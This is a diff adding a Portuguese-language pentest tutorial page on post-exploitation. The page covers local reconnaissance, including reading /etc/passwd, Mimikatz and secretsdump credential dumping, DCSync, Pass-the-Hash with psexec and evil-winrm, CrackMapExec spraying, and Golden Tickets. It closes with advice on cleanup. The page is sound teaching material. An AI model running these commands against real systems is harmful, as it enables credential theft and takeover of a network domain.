@@ -1,0 +1,165 @@
+﻿<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+  <meta name="color-scheme" content="dark light" />
+  <meta name="description" content="Pós-Exploração: lateral movement, persistência, coleta de credenciais, pivoting, exfiltração de dados e como demonstrar impacto real no pentest." />
+  <link rel="preload" href="/css/base.css" as="style" fetchpriority="high" />
+  <link rel="stylesheet" href="/css/base.css" />
+  <link rel="icon" href="/imagens/favicon/favicon.png" type="image/png">
+  <link rel="apple-touch-icon" href="/imagens/favicon/favicon.png">
+  <link rel="preload" href="/js/main.js" as="script">
+  <script src="/js/main.js" defer></script>
+  <title>Pós-Exploração | Site Guia</title>
+</head>
+
+<body>
+  <div class="nav-overlay"></div>
+  <div class="nav-interno-overlay"></div>
+  <button class="menu-toggle" title="Abrir/fechar navegação">
+    <span class="menu-icon">☰</span><span class="close-icon">&ltimes;</span>
+  </button>
+  <button class="menu-interno-toggle" title="Abrir/fechar menu interno">
+    <span class="menu-icon">☰</span><span class="close-icon">&rtimes;</span>
+  </button>
+  <div data-include="/html/Site/partials/header.html"></div>
+
+  <main class="main-content">
+    <div class="content-area">
+
+      <div class="Colored_border_anim_card_box">
+        <p><strong>Pós-Exploração</strong></p>
+      </div>
+
+      <section>
+        <h2 id="conceito" class="section-title">O que é Pós-Exploração?</h2>
+
+        <div class="page-header">
+          <div class="logo logo--lg page-icon" role="img" aria-label="Dragão do Site Guia"></div>
+          <h1>Pós-Exploração</h1>
+          <p>Persistência, escalação de privilégios e movimento lateral após o acesso inicial.</p>
+        </div>
+
+        <p class="intro-highlight">Pós-exploração são as ações tomadas após obter acesso inicial a um sistema. O objetivo é demonstrar o impacto real da vulnerabilidade: o que um atacante real poderia fazer a partir deste ponto? Aprofundar o acesso, mover-se lateralmente e acessar dados sensíveis são as atividades típicas.</p>
+        <div class="section-divider"></div>
+      </section>
+
+      <section>
+        <h2 id="coleta" class="section-title">Coleta de Informações no Sistema</h2>
+        <div class="section-divider"></div>
+
+        <p>Após acesso inicial, mapeie o ambiente comprometido antes de qualquer movimento:</p>
+
+        <div class="grid-cards">
+          <div class="card">
+            <h3>Reconhecimento local</h3>
+            <pre class="code-block" style="font-size:0.8rem">
+# Linux:
+whoami; id; hostname
+cat /etc/passwd; cat /etc/hosts
+ip addr; netstat -tulpn
+ps aux | grep -v '\['
+
+# Windows:
+whoami /all
+net user; net localgroup administrators
+ipconfig /all
+netstat -ano</pre>
+          </div>
+          <div class="card">
+            <h3>Coleta de credenciais — Windows</h3>
+            <p>Com privilégio SYSTEM/Administrator, é possível extrair hashes de senha do SAM e LSASS — usáveis para Pass-the-Hash ou crackeamento offline.</p>
+            <pre class="code-block" style="font-size:0.8rem">
+# Mimikatz:
+privilege::debug
+sekurlsa::logonpasswords  # NTLM hashes
+lsadump::sam              # SAM database hashes
+lsadump::lsa /patch       # Domain hashes se DC
+
+# secretsdump.py (remoto, sem mimikatz):
+secretsdump.py empresa/admin:senha@10.10.10.10</pre>
+          </div>
+        </div>
+      </section>
+
+      <section>
+        <h2 id="lateral" class="section-title">Lateral Movement</h2>
+        <div class="section-divider"></div>
+
+        <p>Mover-se de um sistema para outros usando as credenciais e acessos obtidos. Demonstra que o comprometimento vai além do host inicial.</p>
+
+        <div class="scroll-x">
+          <table>
+            <thead>
+              <tr>
+                <th>Técnica</th>
+                <th>Descrição</th>
+                <th>Ferramenta</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr><td>Pass-the-Hash (PTH)</td><td>Usar hash NTLM sem saber a senha em texto claro</td><td>CrackMapExec, impacket psexec</td></tr>
+              <tr><td>Pass-the-Ticket</td><td>Roubar e reutilizar tickets Kerberos</td><td>Rubeus, mimikatz</td></tr>
+              <tr><td>Kerberoasting</td><td>Requerer tickets de service accounts e crackeá-los offline</td><td>GetUserSPNs.py, Rubeus</td></tr>
+              <tr><td>AS-REP Roasting</td><td>Atacar contas sem pré-autenticação Kerberos</td><td>GetNPUsers.py, Rubeus</td></tr>
+              <tr><td>SMB Lateral Movement</td><td>Executar comandos em outros hosts via SMB com credenciais</td><td>psexec.py, smbexec.py, CrackMapExec</td></tr>
+              <tr><td>WMI / WinRM</td><td>Execução remota via WMI ou Windows Remote Management</td><td>evil-winrm, wmiexec.py</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <pre class="code-block">
+# CrackMapExec — testar credenciais em toda a rede de uma vez:
+crackmapexec smb 192.168.1.0/24 -u admin -p senha
+
+# Pass-the-Hash com impacket:
+psexec.py -hashes :aad3b4...(NTLM hash) empresa/admin@10.10.10.10
+
+# evil-winrm para WinRM com hash:
+evil-winrm -i 10.10.10.10 -u admin -H aad3b4...(NTLM hash)</pre>
+      </section>
+
+      <section>
+        <h2 id="ad-dominance" class="section-title">Domain Dominance no Active Directory</h2>
+        <div class="section-divider"></div>
+
+        <div class="logic-grid">
+          <div class="panel">
+            <h3 class="panel-title"><span data-svg="estrela" aria-hidden="true"></span> Golden Ticket</h3>
+            <p>Com acesso ao Domain Controller e o hash KRBTGT, é possível criar tickets Kerberos forjados com qualquer identidade. Persiste mesmo após reset de senhas de usuários normais. Requer reset duplo do KRBTGT para remediar.</p>
+          </div>
+          <div class="panel">
+            <h3 class="panel-title"><span data-svg="estrela" aria-hidden="true"></span> DCSync</h3>
+            <p>Com privilégios adequados, simular um Domain Controller sincronizando — o que faz o DC entregar todos os hashes de senha do domínio. Equivalente a despejar o ntds.dit sem acesso físico ao DC.</p>
+            <pre class="code-block" style="font-size:0.8rem">
+secretsdump.py -just-dc empresa/admin:senha@dc.empresa.com</pre>
+          </div>
+        </div>
+      </section>
+
+      <section>
+        <h2 id="limpeza" class="section-title">Limpeza e Encerramento</h2>
+        <div class="section-divider"></div>
+
+        <div class="message-block">
+          <p><strong>Após o pentest:</strong> Remova todas as ferramentas, backdoors, usuários e arquivos que foram criados durante o teste. Documente exatamente o que foi criado para garantir limpeza completa. Nunca deixe acesso backdoor em sistemas de produção — mesmo que o cliente peça (deve ir no relatório como riscos, não como backdoor deixado).</p>
+        </div>
+      </section>
+
+      <div class="callout">
+        <p>Pós-exploração demonstra o impacto real — é o que convence stakeholders de que a vulnerabilidade é crítica. Domain Admin comprometido, banco de dados dump, exfiltração simulada — cada evidência conta. Para ferramentas desta fase, veja <a href="/html/seguranca/offensive/ferramentas/metasploit.html">Metasploit</a> e o módulo de post-exploitation.</p>
+        <p class="frase-destaque">
+          <span data-svg="estrela" aria-hidden="true"></span>
+          "A pós-exploração conta a história do ataque completo. Sem ela, o relatório mostra um buraco — mas não o que passa por ele."
+        </p>
+      </div>
+
+    </div>
+  </main>
+
+  <div data-include="/html/Site/partials/footer.html"></div>
+</body>
+
+</html>
